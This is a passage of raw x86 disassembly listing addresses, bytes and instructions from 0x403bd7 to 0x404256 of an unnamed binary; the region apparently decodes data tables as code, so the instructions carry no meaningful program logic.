  403bd7:	00 fc                	add    %bh,%ah
  403bd9:	25 00 00 00 00       	and    $0x0,%eax
  403bde:	91                   	xchg   %eax,%ecx
  403bdf:	00 49 03             	add    %cl,0x3(%ecx)
  403be2:	4a                   	dec    %edx
  403be3:	00 09                	add    %cl,(%ecx)
  403be5:	00 98 26 00 00 00    	add    %bl,0x26(%eax)
  403beb:	00 91 00 5a 03 4f    	add    %dl,0x4f035a00(%ecx)
  403bf1:	00 0a                	add    %cl,(%edx)
  403bf3:	00 6c 27 00          	add    %ch,0x0(%edi,%eiz,1)
  403bf7:	00 00                	add    %al,(%eax)
  403bf9:	00 96 00 6b 03 54    	add    %dl,0x54036b00(%esi)
  403bff:	00 0b                	add    %cl,(%ebx)
  403c01:	00 c4                	add    %al,%ah
  403c03:	27                   	daa
  403c04:	00 00                	add    %al,(%eax)
  403c06:	00 00                	add    %al,(%eax)
  403c08:	96                   	xchg   %eax,%esi
  403c09:	00 72 03             	add    %dh,0x3(%edx)
  403c0c:	40                   	inc    %eax
  403c0d:	00 0b                	add    %cl,(%ebx)
  403c0f:	00 18                	add    %bl,(%eax)
  403c11:	28 00                	sub    %al,(%eax)
  403c13:	00 00                	add    %al,(%eax)
  403c15:	00 91 00 81 03 58    	add    %dl,0x58038100(%ecx)
  403c1b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  403c1e:	88 29                	mov    %ch,(%ecx)
  403c20:	00 00                	add    %al,(%eax)
  403c22:	00 00                	add    %al,(%eax)
  403c24:	91                   	xchg   %eax,%ecx
  403c25:	00 8d 03 5f 00 0f    	add    %cl,0xf005f03(%ebp)
  403c2b:	00 ec                	add    %ch,%ah
  403c2d:	29 00                	sub    %eax,(%eax)
  403c2f:	00 00                	add    %al,(%eax)
  403c31:	00 96 00 9f 03 66    	add    %dl,0x66039f00(%esi)
  403c37:	00 12                	add    %dl,(%edx)
  403c39:	00 38                	add    %bh,(%eax)
  403c3b:	2a 00                	sub    (%eax),%al
  403c3d:	00 00                	add    %al,(%eax)
  403c3f:	00 96 00 b2 03 6b    	add    %dl,0x6b03b200(%esi)
  403c45:	00 12                	add    %dl,(%edx)
  403c47:	00 c8                	add    %cl,%al
  403c49:	2a 00                	sub    (%eax),%al
  403c4b:	00 00                	add    %al,(%eax)
  403c4d:	00 91 00 be 03 34    	add    %dl,0x3403be00(%ecx)
  403c53:	00 14 00             	add    %dl,(%eax,%eax,1)
  403c56:	f8                   	clc
  403c57:	2b 00                	sub    (%eax),%eax
  403c59:	00 00                	add    %al,(%eax)
  403c5b:	00 91 00 d1 03 4a    	add    %dl,0x4a03d100(%ecx)
  403c61:	00 14 00             	add    %dl,(%eax,%eax,1)
  403c64:	f8                   	clc
  403c65:	2c 00                	sub    $0x0,%al
  403c67:	00 00                	add    %al,(%eax)
  403c69:	00 91 00 dd 03 4a    	add    %dl,0x4a03dd00(%ecx)
  403c6f:	00 15 00 40 2e 00    	add    %dl,0x2e4000
  403c75:	00 00                	add    %al,(%eax)
  403c77:	00 91 00 f0 03 34    	add    %dl,0x3403f000(%ecx)
  403c7d:	00 16                	add    %dl,(%esi)
  403c7f:	00 e4                	add    %ah,%ah
  403c81:	2e 00 00             	add    %al,%cs:(%eax)
  403c84:	00 00                	add    %al,(%eax)
  403c86:	91                   	xchg   %eax,%ecx
  403c87:	00 01                	add    %al,(%ecx)
  403c89:	04 34                	add    $0x34,%al
  403c8b:	00 16                	add    %dl,(%esi)
  403c8d:	00 44 2f 00          	add    %al,0x0(%edi,%ebp,1)
  403c91:	00 00                	add    %al,(%eax)
  403c93:	00 91 00 10 04 38    	add    %dl,0x38041000(%ecx)
  403c99:	00 16                	add    %dl,(%esi)
  403c9b:	00 c4                	add    %al,%ah
  403c9d:	2f                   	das
  403c9e:	00 00                	add    %al,(%eax)
  403ca0:	00 00                	add    %al,(%eax)
  403ca2:	91                   	xchg   %eax,%ecx
  403ca3:	00 17                	add    %dl,(%edi)
  403ca5:	04 34                	add    $0x34,%al
  403ca7:	00 16                	add    %dl,(%esi)
  403ca9:	00 0c 30             	add    %cl,(%eax,%esi,1)
  403cac:	00 00                	add    %al,(%eax)
  403cae:	00 00                	add    %al,(%eax)
  403cb0:	91                   	xchg   %eax,%ecx
  403cb1:	00 27                	add    %ah,(%edi)
  403cb3:	04 4a                	add    $0x4a,%al
  403cb5:	00 16                	add    %dl,(%esi)
  403cb7:	00 8c 30 00 00 00 00 	add    %cl,0x0(%eax,%esi,1)
  403cbe:	91                   	xchg   %eax,%ecx
  403cbf:	00 30                	add    %dh,(%eax)
  403cc1:	04 4a                	add    $0x4a,%al
  403cc3:	00 17                	add    %dl,(%edi)
  403cc5:	00 dc                	add    %bl,%ah
  403cc7:	30 00                	xor    %al,(%eax)
  403cc9:	00 00                	add    %al,(%eax)
  403ccb:	00 91 00 3b 04 34    	add    %dl,0x34043b00(%ecx)
  403cd1:	00 18                	add    %bl,(%eax)
  403cd3:	00 e8                	add    %ch,%al
  403cd5:	30 00                	xor    %al,(%eax)
  403cd7:	00 00                	add    %al,(%eax)
  403cd9:	00 91 00 4e 04 34    	add    %dl,0x34044e00(%ecx)
  403cdf:	00 18                	add    %bl,(%eax)
  403ce1:	00 f4                	add    %dh,%ah
  403ce3:	30 00                	xor    %al,(%eax)
  403ce5:	00 00                	add    %al,(%eax)
  403ce7:	00 91 00 62 04 34    	add    %dl,0x34046200(%ecx)
  403ced:	00 18                	add    %bl,(%eax)
  403cef:	00 00                	add    %al,(%eax)
  403cf1:	31 00                	xor    %eax,(%eax)
  403cf3:	00 00                	add    %al,(%eax)
  403cf5:	00 96 00 76 04 34    	add    %dl,0x34047600(%esi)
  403cfb:	00 18                	add    %bl,(%eax)
  403cfd:	00 48 31             	add    %cl,0x31(%eax)
  403d00:	00 00                	add    %al,(%eax)
  403d02:	00 00                	add    %al,(%eax)
  403d04:	91                   	xchg   %eax,%ecx
  403d05:	00 89 04 34 00 18    	add    %cl,0x18003404(%ecx)
  403d0b:	00 10                	add    %dl,(%eax)
  403d0d:	33 00                	xor    (%eax),%eax
  403d0f:	00 00                	add    %al,(%eax)
  403d11:	00 96 00 9c 04 4a    	add    %dl,0x4a049c00(%esi)
  403d17:	00 18                	add    %bl,(%eax)
  403d19:	00 bf 34 00 00 00    	add    %bh,0x34(%edi)
  403d1f:	00 86 18 a9 04 71    	add    %al,0x7104a918(%esi)
  403d25:	00 19                	add    %bl,(%ecx)
  403d27:	00 50 20             	add    %dl,0x20(%eax)
  403d2a:	00 00                	add    %al,(%eax)
  403d2c:	00 00                	add    %al,(%eax)
  403d2e:	91                   	xchg   %eax,%ecx
  403d2f:	00 c2                	add    %al,%dl
  403d31:	06                   	push   %es
  403d32:	34 00                	xor    $0x0,%al
  403d34:	19 00                	sbb    %eax,(%eax)
  403d36:	70 33                	jo     0x403d6b
  403d38:	00 00                	add    %al,(%eax)
  403d3a:	00 00                	add    %al,(%eax)
  403d3c:	91                   	xchg   %eax,%ecx
  403d3d:	18 8b 10 34 00 19    	sbb    %cl,0x19003410(%ebx)
  403d43:	00 00                	add    %al,(%eax)
  403d45:	00 00                	add    %al,(%eax)
  403d47:	00 80 00 96 20 b3    	add    %al,-0x4cdf6a00(%eax)
  403d4d:	04 7a                	add    $0x7a,%al
  403d4f:	00 19                	add    %bl,(%ecx)
  403d51:	00 00                	add    %al,(%eax)
  403d53:	00 00                	add    %al,(%eax)
  403d55:	00 80 00 96 20 ce    	add    %al,-0x31df6a00(%eax)
  403d5b:	04 7f                	add    $0x7f,%al
  403d5d:	00 1b                	add    %bl,(%ebx)
  403d5f:	00 c7                	add    %al,%bh
  403d61:	34 00                	xor    $0x0,%al
  403d63:	00 00                	add    %al,(%eax)
  403d65:	00 91 18 8b 10 34    	add    %dl,0x34108b18(%ecx)
  403d6b:	00 1d 00 d5 34 00    	add    %bl,0x34d500
  403d71:	00 00                	add    %al,(%eax)
  403d73:	00 86 18 a9 04 71    	add    %al,0x7104a918(%esi)
  403d79:	00 1d 00 dd 34 00    	add    %bl,0x34dd00
  403d7f:	00 00                	add    %al,(%eax)
  403d81:	00 86 18 a9 04 71    	add    %al,0x7104a918(%esi)
  403d87:	00 1d 00 02 35 00    	add    %bl,0x350200
  403d8d:	00 00                	add    %al,(%eax)
  403d8f:	00 81 00 f3 04 88    	add    %al,-0x77fb0d00(%ecx)
  403d95:	00 1d 00 1c 35 00    	add    %bl,0x351c00
  403d9b:	00 00                	add    %al,(%eax)
  403d9d:	00 c4                	add    %al,%ah
  403d9f:	00 07                	add    %al,(%edi)
  403da1:	05 8e 00 1e 00       	add    $0x1e008e,%eax
  403da6:	d0 35 00 00 00 00    	shlb   $1,0x0
  403dac:	c4 08                	les    (%eax),%ecx
  403dae:	1c 05                	sbb    $0x5,%al
  403db0:	95                   	xchg   %eax,%ebp
  403db1:	00 1f                	add    %bl,(%edi)
  403db3:	00 0c 36             	add    %cl,(%esi,%esi,1)
  403db6:	00 00                	add    %al,(%eax)
  403db8:	00 00                	add    %al,(%eax)
  403dba:	96                   	xchg   %eax,%esi
  403dbb:	00 2d 05 54 00 1f    	add    %ch,0x1f005405
  403dc1:	00 6c 36 00          	add    %ch,0x0(%esi,%esi,1)
  403dc5:	00 00                	add    %al,(%eax)
  403dc7:	00 96 00 35 05 4a    	add    %dl,0x4a053500(%esi)
  403dcd:	00 1f                	add    %bl,(%edi)
  403dcf:	00 ab 36 00 00 00    	add    %ch,0x36(%ebx)
  403dd5:	00 91 18 8b 10 34    	add    %dl,0x34108b18(%ecx)
  403ddb:	00 20                	add    %ah,(%eax)
  403ddd:	00 fb                	add    %bh,%bl
  403ddf:	23 00                	and    (%eax),%eax
  403de1:	00 00                	add    %al,(%eax)
  403de3:	00 86 18 a9 04 71    	add    %al,0x7104a918(%esi)
  403de9:	00 20                	add    %ah,(%eax)
  403deb:	00 03                	add    %al,(%ebx)
  403ded:	24 00                	and    $0x0,%al
  403def:	00 00                	add    %al,(%eax)
  403df1:	00 86 18 a9 04 71    	add    %al,0x7104a918(%esi)
  403df7:	00 20                	add    %ah,(%eax)
  403df9:	00 28                	add    %ch,(%eax)
  403dfb:	24 00                	and    $0x0,%al
  403dfd:	00 00                	add    %al,(%eax)
  403dff:	00 86 00 5f 0a a7    	add    %al,-0x58f5a100(%esi)
  403e05:	00 20                	add    %ah,(%eax)
  403e07:	00 ac 25 00 00 00 00 	add    %ch,0x0(%ebp,%eiz,1)
  403e0e:	86 00                	xchg   %al,(%eax)
  403e10:	76 0a                	jbe    0x403e1c
  403e12:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403e13:	00 21                	add    %ah,(%ecx)
  403e15:	00 0b                	add    %cl,(%ebx)
  403e17:	24 00                	and    $0x0,%al
  403e19:	00 00                	add    %al,(%eax)
  403e1b:	00 86 18 a9 04 71    	add    %al,0x7104a918(%esi)
  403e21:	00 22                	add    %ah,(%edx)
  403e23:	00 13                	add    %dl,(%ebx)
  403e25:	24 00                	and    $0x0,%al
  403e27:	00 00                	add    %al,(%eax)
  403e29:	00 86 00 a7 0a 80    	add    %al,-0x7ff55900(%esi)
  403e2f:	01 22                	add    %esp,(%edx)
  403e31:	00 b0 2a 00 00 00    	add    %dh,0x2a(%eax)
  403e37:	00 86 18 a9 04 71    	add    %al,0x7104a918(%esi)
  403e3d:	00 23                	add    %ah,(%ebx)
  403e3f:	00 b8 2a 00 00 00    	add    %bh,0x2a(%eax)
  403e45:	00 86 00 9d 0e 80    	add    %al,-0x7ff16300(%esi)
  403e4b:	01 23                	add    %esp,(%ebx)
  403e4d:	00 f7                	add    %dh,%bh
  403e4f:	35 00 00 00 00       	xor    $0x0,%eax
  403e54:	86 18                	xchg   %bl,(%eax)
  403e56:	a9 04 71 00 24       	test   $0x24007104,%eax
  403e5b:	00 ff                	add    %bh,%bh
  403e5d:	35 00 00 00 00       	xor    $0x0,%eax
  403e62:	86 00                	xchg   %al,(%eax)
  403e64:	1f                   	pop    %ds
  403e65:	11 71 00             	adc    %esi,0x0(%ecx)
  403e68:	24 00                	and    $0x0,%al
  403e6a:	55                   	push   %ebp
  403e6b:	36 00 00             	add    %al,%ss:(%eax)
  403e6e:	00 00                	add    %al,(%eax)
  403e70:	86 18                	xchg   %bl,(%eax)
  403e72:	a9 04 71 00 24       	test   $0x24007104,%eax
  403e77:	00 5d 36             	add    %bl,0x36(%ebp)
  403e7a:	00 00                	add    %al,(%eax)
  403e7c:	00 00                	add    %al,(%eax)
  403e7e:	86 00                	xchg   %al,(%eax)
  403e80:	76 11                	jbe    0x403e93
  403e82:	71 00                	jno    0x403e84
  403e84:	24 00                	and    $0x0,%al
  403e86:	00 00                	add    %al,(%eax)
  403e88:	01 00                	add    %eax,(%eax)
  403e8a:	3d 05 00 00 02       	cmp    $0x2000005,%eax
  403e8f:	00 44 05 00          	add    %al,0x0(%ebp,%eax,1)
  403e93:	00 03                	add    %al,(%ebx)
  403e95:	00 4b 05             	add    %cl,0x5(%ebx)
  403e98:	00 00                	add    %al,(%eax)
  403e9a:	04 00                	add    $0x0,%al
  403e9c:	52                   	push   %edx
  403e9d:	05 00 00 01 00       	add    $0x10000,%eax
  403ea2:	59                   	pop    %ecx
  403ea3:	05 00 00 01 00       	add    $0x10000,%eax
  403ea8:	5e                   	pop    %esi
  403ea9:	05 00 00 01 00       	add    $0x10000,%eax
  403eae:	5e                   	pop    %esi
  403eaf:	05 00 00 01 00       	add    $0x10000,%eax
  403eb4:	65 05 00 00 01 00    	gs add $0x10000,%eax
  403eba:	6f                   	outsl  %ds:(%esi),(%dx)
  403ebb:	05 00 00 01 00       	add    $0x10000,%eax
  403ec0:	78 05                	js     0x403ec7
  403ec2:	00 00                	add    %al,(%eax)
  403ec4:	01 00                	add    %eax,(%eax)
  403ec6:	5e                   	pop    %esi
  403ec7:	05 00 00 01 00       	add    $0x10000,%eax
  403ecc:	82 05 00 00 02 00 8c 	addb   $0x8c,0x20000
  403ed3:	05 00 00 03 00       	add    $0x30000,%eax
  403ed8:	95                   	xchg   %eax,%ebp
  403ed9:	05 00 00 01 00       	add    $0x10000,%eax
  403ede:	82 05 00 00 02 00 8c 	addb   $0x8c,0x20000
  403ee5:	05 00 00 03 00       	add    $0x30000,%eax
  403eea:	9c                   	pushf
  403eeb:	05 00 00 01 00       	add    $0x10000,%eax
  403ef0:	a8 05                	test   $0x5,%al
  403ef2:	00 00                	add    %al,(%eax)
  403ef4:	02 00                	add    (%eax),%al
  403ef6:	b6 05                	mov    $0x5,%dh
  403ef8:	00 00                	add    %al,(%eax)
  403efa:	01 00                	add    %eax,(%eax)
  403efc:	04 01                	add    $0x1,%al
  403efe:	00 00                	add    %al,(%eax)
  403f00:	01 00                	add    %eax,(%eax)
  403f02:	04 01                	add    $0x1,%al
  403f04:	00 00                	add    %al,(%eax)
  403f06:	01 00                	add    %eax,(%eax)
  403f08:	e8 00 00 00 01       	call   0x1403f0d
  403f0d:	00 c6                	add    %al,%dh
  403f0f:	05 00 00 01 00       	add    $0x10000,%eax
  403f14:	cf                   	iret
  403f15:	05 00 20 00 00       	add    $0x2000,%eax
  403f1a:	00 00                	add    %al,(%eax)
  403f1c:	00 00                	add    %al,(%eax)
  403f1e:	01 00                	add    %eax,(%eax)
  403f20:	16                   	push   %ss
  403f21:	06                   	push   %es
  403f22:	00 00                	add    %al,(%eax)
  403f24:	01 00                	add    %eax,(%eax)
  403f26:	1b 06                	sbb    (%esi),%eax
  403f28:	00 00                	add    %al,(%eax)
  403f2a:	02 00                	add    (%eax),%al
  403f2c:	25 06 00 00 01       	and    $0x1000006,%eax
  403f31:	00 33                	add    %dh,(%ebx)
  403f33:	06                   	push   %es
  403f34:	00 00                	add    %al,(%eax)
  403f36:	01 00                	add    %eax,(%eax)
  403f38:	3b 06                	cmp    (%esi),%eax
  403f3a:	00 00                	add    %al,(%eax)
  403f3c:	01 00                	add    %eax,(%eax)
  403f3e:	3d 06 00 00 01       	cmp    $0x1000006,%eax
  403f43:	00 be 0a 00 00 01    	add    %bh,0x100000a(%esi)
  403f49:	00 be 0a 00 00 01    	add    %bh,0x100000a(%esi)
  403f4f:	00 c0                	add    %al,%al
  403f51:	0a 00                	or     (%eax),%al
  403f53:	00 01                	add    %al,(%ecx)
  403f55:	00 c0                	add    %al,%al
  403f57:	0a 41 00             	or     0x0(%ecx),%al
  403f5a:	a9 04 9f 00 51       	test   $0x51009f04,%eax
  403f5f:	00 a9 04 a7 00 59    	add    %ch,0x5900a704(%ecx)
  403f65:	00 a9 04 71 00 61    	add    %ch,0x61007104(%ecx)
  403f6b:	00 a9 04 ac 00 71    	add    %ch,0x7100ac04(%ecx)
  403f71:	00 a9 04 71 00 79    	add    %ch,0x79007104(%ecx)
  403f77:	00 44 07 ba          	add    %al,-0x46(%edi,%eax,1)
  403f7b:	00 69 00             	add    %ch,0x0(%ecx)
  403f7e:	a9 04 c0 00 89       	test   $0x8900c004,%eax
  403f83:	00 a9 04 c6 00 89    	add    %ch,-0x76ff39fc(%ecx)
  403f89:	00 50 07             	add    %dl,0x7(%eax)
  403f8c:	71 00                	jno    0x403f8e
  403f8e:	91                   	xchg   %eax,%ecx
  403f8f:	00 62 07             	add    %ah,0x7(%edx)
  403f92:	cc                   	int3
  403f93:	00 99 00 bb 02 d1    	add    %bl,-0x2efd4500(%ecx)
  403f99:	00 a9 00 88 07 d7    	add    %ch,-0x28f87800(%ecx)
  403f9f:	00 a9 00 c2 07 dc    	add    %ch,-0x23f83e00(%ecx)
  403fa5:	00 b1 00 ce 07 e1    	add    %dh,-0x1ef83200(%ecx)
  403fab:	00 a1 00 d7 07 e5    	add    %ah,-0x1af82900(%ecx)
  403fb1:	00 b9 00 fe 07 f8    	add    %bh,-0x7f80200(%ecx)
  403fb7:	00 b9 00 0f 08 e1    	add    %bh,-0x1ef7f100(%ecx)
  403fbd:	00 c1                	add    %al,%cl
  403fbf:	00 2b                	add    %ch,(%ebx)
  403fc1:	08 45 00             	or     %al,0x0(%ebp)
  403fc4:	91                   	xchg   %eax,%ecx
  403fc5:	00 4a 08             	add    %cl,0x8(%edx)
  403fc8:	fd                   	std
  403fc9:	00 a1 00 58 08 e5    	add    %ah,-0x1af7a800(%ecx)
  403fcf:	00 89 00 66 08 cc    	add    %cl,-0x33f79a00(%ecx)
  403fd5:	00 d1                	add    %dl,%cl
  403fd7:	00 91 08 08 01 a1    	add    %dl,-0x5efef7f8(%ecx)
  403fdd:	00 9d 08 6b 00 d9    	add    %bl,-0x26ff94f8(%ebp)
  403fe3:	00 a4 08 0c 01 d9 00 	add    %ah,0xd9010c(%eax,%ecx,1)
  403fea:	b1 08                	mov    $0x8,%cl
  403fec:	12 01                	adc    (%ecx),%al
  403fee:	d9 00                	flds   (%eax)
  403ff0:	ba 08 71 00 09       	mov    $0x9007108,%edx
  403ff5:	00 c0                	add    %al,%al
  403ff7:	08 e1                	or     %ah,%cl
  403ff9:	00 a1 00 c9 08 17    	add    %ah,0x1708c900(%ecx)
  403fff:	01 e1                	add    %esp,%ecx
  404001:	00 e0                	add    %ah,%al
  404003:	08 71 00             	or     %dh,0x0(%ecx)
  404006:	e9 00 03 09 22       	jmp    0x2249430b
  40400b:	01 e9                	add    %ebp,%ecx
  40400d:	00 10                	add    %dl,(%eax)
  40400f:	09 28                	or     %ebp,(%eax)
  404011:	01 e9                	add    %ebp,%ecx
  404013:	00 3a                	add    %bh,(%edx)
  404015:	09 2d 01 f1 00 54    	or     %ebp,0x5400f101
  40401b:	09 32                	or     %esi,(%edx)
  40401d:	01 f9                	add    %edi,%ecx
  40401f:	00 5d 09             	add    %bl,0x9(%ebp)
  404022:	e1 00                	loope  0x404024
  404024:	b9 00 6a 09 f8       	mov    $0xf8096a00,%ecx
  404029:	00 e9                	add    %ch,%cl
  40402b:	00 7f 09             	add    %bh,0x9(%edi)
  40402e:	17                   	pop    %ss
  40402f:	01 09                	add    %ecx,(%ecx)
  404031:	01 a9 04 71 00 29    	add    %ebp,0x29007104(%ecx)
  404037:	00 aa 09 47 01 a1    	add    %ch,-0x5efeb8f7(%edx)
  40403d:	00 af 09 4d 01 09    	add    %ch,0x9014d09(%edi)
  404043:	01 b9 09 52 01 11    	add    %edi,0x11015209(%ecx)
  404049:	01 c9                	add    %ecx,%ecx
  40404b:	09 61 01             	or     %esp,0x1(%ecx)
  40404e:	11 01                	adc    %eax,(%ecx)
  404050:	d2 09                	rorb   %cl,(%ecx)
  404052:	67 01 19             	add    %ebx,(%bx,%di)
  404055:	01 e3                	add    %esp,%ebx
  404057:	09 6d 01             	or     %ebp,0x1(%ebp)
  40405a:	09 00                	or     %eax,(%eax)
  40405c:	a9 04 71 00 a1       	test   $0xa1007104,%eax
  404061:	00 c2                	add    %al,%dl
  404063:	0a e1                	or     %cl,%ah
  404065:	00 c1                	add    %al,%cl
  404067:	00 ca                	add    %cl,%dl
  404069:	0a 45 00             	or     0x0(%ebp),%al
  40406c:	c1 00 d7             	roll   $0xd7,(%eax)
  40406f:	0a 45 00             	or     0x0(%ebp),%al
  404072:	0c 00                	or     $0x0,%al
  404074:	a9 04 c0 00 29       	test   $0x2900c004,%eax
  404079:	01 f5                	add    %esi,%ebp
  40407b:	0a 8c 01 31 01 a9 04 	or     0x4a90131(%ecx,%eax,1),%cl
  404082:	ac                   	lods   %ds:(%esi),%al
  404083:	00 39                	add    %bh,(%ecx)
  404085:	01 23                	add    %esp,(%ebx)
  404087:	0b 9f 01 31 01 c9    	or     -0x36feceff(%edi),%ebx
  40408d:	08 a6 01 a1 00 9d    	or     %ah,-0x62ff5eff(%esi)
  404093:	08 aa 01 49 01 f5    	or     %ch,-0xafeb6ff(%edx)
  404099:	0a 4f 00             	or     0x0(%edi),%cl
  40409c:	49                   	dec    %ecx
  40409d:	01 45 0b             	add    %eax,0xb(%ebp)
  4040a0:	b1 01                	mov    $0x1,%cl
  4040a2:	59                   	pop    %ecx
  4040a3:	01 a9 04 ac 00 39    	add    %ebp,0x3900ac04(%ecx)
  4040a9:	01 61 0b             	add    %esp,0xb(%ecx)
  4040ac:	c9                   	leave
  4040ad:	01 61 01             	add    %esp,0x1(%ecx)
  4040b0:	7a 0b                	jp     0x4040bd
  4040b2:	d5 01                	aad    $0x1
  4040b4:	14 00                	adc    $0x0,%al
  4040b6:	a9 04 c0 00 71       	test   $0x7100c004,%eax
  4040bb:	01 bf 0b e2 01 61    	add    %edi,0x6101e20b(%edi)
  4040c1:	01 c3                	add    %eax,%ebx
  4040c3:	0b d5                	or     %ebp,%edx
  4040c5:	01 a1 00 d2 0b 80    	add    %esp,-0x7ff42e00(%ecx)
  4040cb:	01 09                	add    %ecx,(%ecx)
  4040cd:	01 db                	add    %ebx,%ebx
  4040cf:	0b 03                	or     (%ebx),%eax
  4040d1:	02 29                	add    (%ecx),%ch
  4040d3:	00 a9 04 71 00 29    	add    %ch,0x29007104(%ecx)
  4040d9:	00 aa 09 10 02 89    	add    %ch,-0x76fdeff7(%edx)
  4040df:	01 66 0c             	add    %esp,0xc(%esi)
  4040e2:	20 02                	and    %al,(%edx)
  4040e4:	99                   	cltd
  4040e5:	01 a9 04 2a 02 a9    	add    %ebp,-0x56fdd5fc(%ecx)
  4040eb:	01 a9 04 71 00 b1    	add    %ebp,-0x4eff8efc(%ecx)
  4040f1:	01 ca                	add    %ecx,%edx
  4040f3:	0c a7                	or     $0xa7,%al
  4040f5:	00 b1 01 d6 0c a7    	add    %dh,-0x58f329ff(%ecx)
  4040fb:	00 b1 01 f0 0c 32    	add    %dh,0x320cf001(%ecx)
  404101:	02 c1                	add    %cl,%al
  404103:	01 a9 04 39 02 b1    	add    %ebp,-0x4efdc6fc(%ecx)
  404109:	01 0f                	add    %ecx,(%edi)
  40410b:	0d 17 01 c9 01       	or     $0x1c90117,%eax
  404110:	d2 09                	rorb   %cl,(%ecx)
  404112:	42                   	inc    %edx
  404113:	02 b1 01 27 0d 48    	add    0x480d2701(%ecx),%dh
  404119:	02 b1 01 2f 0d 17    	add    0x170d2f01(%ecx),%dh
  40411f:	01 b1 01 3d 0d 48    	add    %esi,0x480d3d01(%ecx)
  404125:	02 b1 01 4f 0d 4e    	add    0x4e0d4f01(%ecx),%dh
  40412b:	02 d9                	add    %cl,%bl
  40412d:	01 5f 0d             	add    %ebx,0xd(%edi)
  404130:	55                   	push   %ebp
  404131:	02 b1 01 76 0d 5d    	add    0x5d0d7601(%ecx),%dh
  404137:	02 e9                	add    %cl,%ch
  404139:	01 a9 04 63 02 d9    	add    %ebp,-0x26fd9cfc(%ecx)
  40413f:	01 a4 0d 70 02 d9 01 	add    %esp,0x1d90270(%ebp,%ecx,1)
  404146:	ab                   	stos   %eax,%es:(%edi)
  404147:	0d 71 00 d9 01       	or     $0x1d90071,%eax
  40414c:	ba 08 71 00 99       	mov    $0x99007108,%edx
  404151:	01 a9 04 77 02 01    	add    %ebp,0x1027704(%ecx)
  404157:	02 a9 04 70 02 09    	add    0x9027004(%ecx),%ch
  40415d:	02 5f 0d             	add    0xd(%edi),%bl
  404160:	ac                   	lods   %ds:(%esi),%al
  404161:	00 09                	add    %cl,(%ecx)
  404163:	02 ab 0d 71 00 09    	add    0x900710d(%ebx),%ch
  404169:	02 ba 08 71 00 49    	add    0x49007108(%edx),%bh
  40416f:	01 d4                	add    %edx,%esp
  404171:	0d 82 02 49 01       	or     $0x1490282,%eax
  404176:	e1 0d                	loope  0x404185
  404178:	4a                   	dec    %edx
  404179:	00 99 01 a9 04 a5    	add    %bl,-0x5afb56ff(%ecx)
  40417f:	02 d9                	add    %cl,%bl
  404181:	01 f2                	add    %esi,%edx
  404183:	0d b3 02 19 02       	or     $0x21902b3,%eax
  404188:	a9 04 71 00 21       	test   $0x21007104,%eax
  40418d:	02 d2                	add    %dl,%dl
  40418f:	09 48 02             	or     %ecx,0x2(%eax)
  404192:	29 02                	sub    %eax,(%edx)
  404194:	a9 04 a7 00 31       	test   $0x3100a704,%eax
  404199:	02 58 0e             	add    0xe(%eax),%bl
  40419c:	ac                   	lods   %ds:(%esi),%al
  40419d:	00 29                	add    %ch,(%ecx)
  40419f:	02 66 0e             	add    0xe(%esi),%ah
  4041a2:	c7 02 29 02 6e 0e    	movl   $0xe6e0229,(%edx)
  4041a8:	cf                   	iret
  4041a9:	02 39                	add    (%ecx),%bh
  4041ab:	02 c0                	add    %al,%al
  4041ad:	0e                   	push   %cs
  4041ae:	e0 02                	loopne 0x4041b2
  4041b0:	91                   	xchg   %eax,%ecx
  4041b1:	00 ca                	add    %cl,%dl
  4041b3:	0e                   	push   %cs
  4041b4:	54                   	push   %esp
  4041b5:	00 c1                	add    %al,%cl
  4041b7:	00 de                	add    %bl,%dh
  4041b9:	0e                   	push   %cs
  4041ba:	45                   	inc    %ebp
  4041bb:	00 39                	add    %bh,(%ecx)
  4041bd:	01 ce                	add    %ecx,%esi
  4041bf:	07                   	pop    %es
  4041c0:	e1 00                	loope  0x4041c2
  4041c2:	41                   	inc    %ecx
  4041c3:	02 f4                	add    %ah,%dh
  4041c5:	0e                   	push   %cs
  4041c6:	ff 02                	incl   (%edx)
  4041c8:	41                   	inc    %ecx
  4041c9:	02 06                	add    (%esi),%al
  4041cb:	0f e1 00             	psraw  (%eax),%mm0
  4041ce:	49                   	dec    %ecx
  4041cf:	01 17                	add    %edx,(%edi)
  4041d1:	0f 05                	syscall
  4041d3:	03 49 01             	add    0x1(%ecx),%ecx
  4041d6:	24 0f                	and    $0xf,%al
  4041d8:	0b 03                	or     (%ebx),%eax
  4041da:	49                   	dec    %ecx
  4041db:	02 a9 04 ac 00 49    	add    0x4900ac04(%ecx),%ch
  4041e1:	02 43 0f             	add    0xf(%ebx),%al
  4041e4:	ac                   	lods   %ds:(%esi),%al
  4041e5:	00 e9                	add    %ch,%cl
  4041e7:	00 a9 04 71 00 e9    	add    %ch,-0x16ff8efc(%ecx)
  4041ed:	00 58 0f             	add    %bl,0xf(%eax)
  4041f0:	12 03                	adc    (%ebx),%al
  4041f2:	e9 00 50 07 19       	jmp    0x194791f7
  4041f7:	03 49 02             	add    0x2(%ecx),%ecx
  4041fa:	66 0f cf             	bswap  %di
  4041fd:	02 49 02             	add    0x2(%ecx),%cl
  404200:	7a 0f                	jp     0x404211
  404202:	ac                   	lods   %ds:(%esi),%al
  404203:	00 49 02             	add    %cl,0x2(%ecx)
  404206:	96                   	xchg   %eax,%esi
  404207:	0f 31                	rdtsc
  404209:	03 e9                	add    %ecx,%ebp
  40420b:	00 50 07             	add    %dl,0x7(%eax)
  40420e:	38 03                	cmp    %al,(%ebx)
  404210:	59                   	pop    %ecx
  404211:	02 cb                	add    %bl,%cl
  404213:	0f 17 01             	movhps %xmm0,(%ecx)
  404216:	e9 00 df 0f e1       	jmp    0xe150211b
  40421b:	00 a1 00 9d 08 58    	add    %ah,0x58089d00(%ecx)
  404221:	03 01                	add    (%ecx),%eax
  404223:	02 a9 04 ac 00 09    	add    0x900ac04(%ecx),%ch
  404229:	02 ef                	add    %bh,%ch
  40422b:	0f ac 00 a1          	shrd   $0xa1,%eax,(%eax)
  40422f:	00 f9                	add    %bh,%cl
  404231:	0f 60 03             	punpcklbw (%ebx),%mm0
  404234:	e9 00 50 07 70       	jmp    0x70479239
  404239:	03 d9                	add    %ecx,%ebx
  40423b:	00 01                	add    %al,(%ecx)
  40423d:	10 80 03 d9 00 0c    	adc    %al,0xc00d903(%eax)
  404243:	10 87 03 49 01 15    	adc    %al,0x15014903(%edi)
  404249:	10 82 02 49 02 a9    	adc    %al,-0x56fdb6fe(%edx)
  40424f:	04 71                	add    $0x71,%al
  404251:	00 49 02             	add    %cl,0x2(%ecx)
  404254:	1a 10                	sbb    (%eax),%dl
  404256:	ac                   	lods   %ds:(%esi),%al
